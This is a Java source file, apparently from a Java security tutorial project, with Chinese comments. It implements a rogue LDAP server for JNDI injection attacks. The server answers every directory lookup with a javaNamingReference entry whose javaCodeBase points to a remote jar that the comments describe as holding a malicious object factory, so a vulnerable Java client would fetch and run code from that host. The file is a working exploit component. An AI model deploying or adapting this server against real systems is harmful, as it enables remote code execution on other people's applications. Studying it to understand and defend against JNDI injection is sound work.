package com.anbai.sec.jndi.injection;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPReferenceServerTest {

	// 设置LDAP服务端口
	public static final int SERVER_PORT = 3890;

	// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
	public static final String BIND_HOST = "127.0.0.1";

	// 设置一个实体名称
	public static final String LDAP_ENTRY_NAME = "test";

	// 获取LDAP服务地址
	public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;

	// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
	public static final String REMOTE_REFERENCE_JAR = "https://anbai.io/tools/jndi-test.jar";

	// 设置LDAP基底DN
	private static final String LDAP_BASE = "dc=javasec,dc=org";

	public static void main(String[] args) {
		try {
			// 创建LDAP配置对象
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);

			// 设置LDAP监听配置信息
			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
					ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault())
			);

			// 添加自定义的LDAP操作拦截器
			config.addInMemoryOperationInterceptor(new OperationInterceptor());

			// 创建LDAP服务对象
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

			// 启动服务
			ds.startListening();

			System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static class OperationInterceptor extends InMemoryOperationInterceptor {

		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base  = result.getRequest().getBaseDN();
			Entry  entry = new Entry(base);

			try {
				// 设置对象的工厂类名
				String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
				entry.addAttribute("javaClassName", className);
				entry.addAttribute("javaFactory", className);

				// 设置远程的恶意引用对象的jar地址
				entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);

				// 设置LDAP objectClass
				entry.addAttribute("objectClass", "javaNamingReference");

				result.sendSearchEntry(entry);
				result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}

	}
}